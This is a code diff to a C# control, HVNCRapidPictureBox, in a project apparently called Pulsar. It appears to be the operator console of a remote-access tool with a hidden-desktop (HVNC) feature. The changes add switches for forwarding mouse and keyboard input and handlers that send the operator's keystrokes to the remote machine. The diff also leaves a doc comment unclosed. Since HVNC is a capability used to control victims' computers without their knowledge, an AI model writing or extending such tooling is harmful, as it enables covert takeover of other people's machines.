@@ -3,6 +3,7 @@ using Pulsar.Server.Messages;
 using Pulsar.Server.Networking;
 using Pulsar.Server.Utilities;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Runtime.InteropServices;
@@ -10,11 +11,13 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Pulsar.Server.Controls
-{
+{    
     public interface IHVNCRapidPictureBox
     {
         bool Running { get; set; }
         Image GetImageSafe { get; set; }
+        bool EnableMouseInput { get; set; }
+        bool EnableKeyboardInput { get; set; }
 
         void Start();
         void Stop();
@@ -23,7 +26,7 @@ namespace Pulsar.Server.Controls
 
     /// <summary>
     /// Custom PictureBox Control designed for rapidly-changing images.
-    /// </summary>
+    /// </summary>    
     public class HVNCRapidPictureBox : PictureBox, IRapidPictureBox
     {
         /// <summary>
@@ -40,6 +43,16 @@ namespace Pulsar.Server.Controls
         /// Returns the height of the original screen.
         /// </summary>
         public int ScreenHeight { get; private set; }
+        
+        /// <summary>
+        /// Determines if mouse input is enabled.
+        /// </summary>
+        public bool EnableMouseInput { get; set; }
+        
+        /// <summary>
+        /// Determines if keyboard input is enabled.
+        /// </summary>
+        public bool EnableKeyboardInput { get; set; }
 
         /// <summary>
         /// Provides thread-safe access to the Image of this Picturebox.
@@ -89,6 +102,21 @@ namespace Pulsar.Server.Controls
         Client client = null;
 
         /// <summary>
+        /// Tracks which keys are currently pressed to prevent multiple keydown events
+        /// </summary>
+        private readonly HashSet<string> _pressedKeys = new HashSet<string>();
+
+        /// <summary>
+        /// Timer for keyboard input debouncing
+        /// </summary>
+        private System.Windows.Forms.Timer _keyboardDebounceTimer = new System.Windows.Forms.Timer();
+
+        /// <summary>
+        /// Last key processed time tracking dictionary
+        /// </summary>
+        private readonly Dictionary<Keys, DateTime> _lastKeyPressTime = new Dictionary<Keys, DateTime>();
+
+        /// <summary>
         /// Subscribes an Eventhandler to the FrameUpdated event.
         /// </summary>
         /// <param name="e">The Eventhandler to set.</param>
@@ -121,14 +149,16 @@ namespace Pulsar.Server.Controls
         public void addClient(Client client)
         {
             this.client = client;
-        }
-
+        }        
+        
         /// <summary>
         /// Stops the internal FPS measuring.
         /// </summary>
         public void Stop()
         {
             _sWatch?.Stop();
+            
+            _pressedKeys.Clear();
 
             Running = false;
         }
@@ -169,10 +199,15 @@ namespace Pulsar.Server.Controls
 
         /// <summary>
         /// Constructor, sets Picturebox double-buffered and initializes the Framecounter.
-        /// </summary>
         public HVNCRapidPictureBox()
         {
             this.SetStyle(ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
+            
+            EnableMouseInput = false;
+            EnableKeyboardInput = false;
+            
+            _keyboardDebounceTimer.Interval = 10;
+            _keyboardDebounceTimer.Tick += (s, e) => _keyboardDebounceTimer.Stop();
         }
 
         protected override CreateParams CreateParams
@@ -256,8 +291,7 @@ namespace Pulsar.Server.Controls
                 return c;
 
             return (char)r;
-        }
-
+        }        
         protected override void WndProc(ref Message m)
         {
             if (this.Image == null)
@@ -279,6 +313,12 @@ namespace Pulsar.Server.Controls
                 case 0x0209: // WM_MBUTTONDBLCLK
                 case 0x0200: // WM_MOUSEMOVE
                 case 0x020A: // WM_MOUSEWHEEL
+                    if (!EnableMouseInput || client == null)
+                    {
+                        base.WndProc(ref m);
+                        return;
+                    }
+
                     short delta = (short)((m.WParam.ToInt64() >> 16) & 0xFFFF);
 
                     int x = (int)(m.LParam.ToInt64() & 0xFFFF);
@@ -303,62 +343,125 @@ namespace Pulsar.Server.Controls
 
                 case 0x0302:
                     break;
-
                 case 0x0100:
                 case 0x0101:
-                    msg = (uint)m.Msg;
-                    wParam = m.WParam;
-                    lParam = m.LParam;
-
-                    bool isShiftPressed = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
-                    bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
-                    if (isShiftPressed || isCapsLockOn)
-                    {
-                        const int VK_SHIFT = 0x10;
-                        const int VK_CAPITAL = 0x14;
-
-                        if (wParam.ToInt32() == VK_SHIFT || wParam.ToInt32() == VK_CAPITAL)
-                        {
-                            break;
-                        }
-
-                        if (isShiftPressed)
-                        {
-                            msg = 0x0102;
-                            uint scanCode = (uint)((lParam.ToInt64() >> 16) & 0xFF);
-                            byte[] keyboardState = new byte[256];
-                            ToAscii((uint)wParam.ToInt64(), scanCode, keyboardState, out uint charCode, 0);
-                            wParam = (IntPtr)Convert.ToInt32(GetModifiedKey((char)charCode));
-                        }
-
-                        if (isCapsLockOn)
-                        {
-                            uint scanCode = (uint)((lParam.ToInt64() >> 16) & 0xFF);
-                            byte[] keyboardState = new byte[256];
-                            ToAscii((uint)wParam.ToInt64(), scanCode, keyboardState, out uint charCode, 0);
-                            if (IsAlphaNumeric((char)charCode))
-                            {
-                                msg = 0x0102;
-                            }
-                        }
-                    }
-                    try
-                    {
-                        Imsg = (long)msg;
-                        IwParam = wParam.ToInt64();
-                        IlParam = lParam.ToInt64();
-                        Task.Run(() =>
-                        {
-                            client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
-                        }).Wait();
-                        break;
-                    }
-                    catch
-                    {
-                        break;
-                    }
+                    base.WndProc(ref m);
+                    return;
             }
             base.WndProc(ref m);
+        }
+
+        protected override bool IsInputKey(Keys keyData)
+        {
+            if (EnableKeyboardInput)
+            {
+                if ((keyData & Keys.KeyCode) == Keys.Left || 
+                    (keyData & Keys.KeyCode) == Keys.Right || 
+                    (keyData & Keys.KeyCode) == Keys.Up || 
+                    (keyData & Keys.KeyCode) == Keys.Down ||
+                    (keyData & Keys.KeyCode) == Keys.Tab)
+                {
+                    return true;
+                }
+            }
+            
+            return base.IsInputKey(keyData);
+        }        protected override void OnKeyDown(KeyEventArgs e)
+        {
+            if (EnableKeyboardInput && client != null)
+            {
+                uint msg = 0x0100;
+                IntPtr wParam = (IntPtr)e.KeyValue;
+                IntPtr lParam = IntPtr.Zero;
+                
+                try
+                {
+                    string keyIdentifier = $"{e.KeyCode}";
+                    
+                    DateTime now = DateTime.Now;
+                    bool shouldSendKey = false;
+                    
+                    if (!_lastKeyPressTime.ContainsKey(e.KeyCode))
+                    {
+                        _lastKeyPressTime[e.KeyCode] = now;
+                        shouldSendKey = true;
+                    }
+                    else 
+                    {
+                        TimeSpan timeSinceLastPress = now - _lastKeyPressTime[e.KeyCode];
+                        if (timeSinceLastPress.TotalMilliseconds > 50)
+                        {
+                            _lastKeyPressTime[e.KeyCode] = now;
+                            shouldSendKey = true;
+                        }
+                    }
+                    
+                    if (shouldSendKey && !_pressedKeys.Contains(keyIdentifier))
+                    {
+                        if (e.KeyCode == Keys.ShiftKey || e.KeyCode == Keys.ControlKey || 
+                            e.KeyCode == Keys.Menu || e.KeyCode == Keys.LWin || e.KeyCode == Keys.RWin)
+                        {
+                            msg = 0x0100;
+                        }
+
+                        client.Send(new DoHVNCInput { msg = msg, wParam = (int)wParam.ToInt64(), lParam = (int)lParam.ToInt64() });
+                        _pressedKeys.Add(keyIdentifier);
+                    }
+                    
+                    e.Handled = true;
+                }
+                catch
+                {
+                    // Ignore any errors in sending
+                }
+            }
+            
+            base.OnKeyDown(e);
+        }
+          protected override void OnKeyUp(KeyEventArgs e)
+        {
+            if (EnableKeyboardInput && client != null)
+            {
+                uint msg = 0x0101;
+                IntPtr wParam = (IntPtr)e.KeyValue;
+                IntPtr lParam = IntPtr.Zero;
+                
+                try
+                {
+                    client.Send(new DoHVNCInput { msg = msg, wParam = (int)wParam.ToInt64(), lParam = (int)lParam.ToInt64() });
+                    
+                    string keyIdentifier = $"{e.KeyCode}";
+                    _pressedKeys.Remove(keyIdentifier);
+                    
+                    e.Handled = true;
+                }
+                catch
+                {
+                    // Ignore any errors in sending
+                }
+            }
+            
+            base.OnKeyUp(e);
+        }
+
+        /// <summary>
+        /// Sets the picture box as the focused control when keyboard input is enabled
+        /// </summary>
+        public void SetFocusIfInputEnabled()
+        {
+            if (EnableKeyboardInput && this.Parent != null && this.Parent.ContainsFocus)
+            {
+                this.Focus();
+            }
+        }        
+        
+        /// <summary>
+        /// Clears the keyboard focus and resets key tracking when keyboard input is disabled
+        /// </summary>
+        public void ClearKeyboardState()
+        {
+            _pressedKeys.Clear();
+            _lastKeyPressTime.Clear();
         }
     }
 }
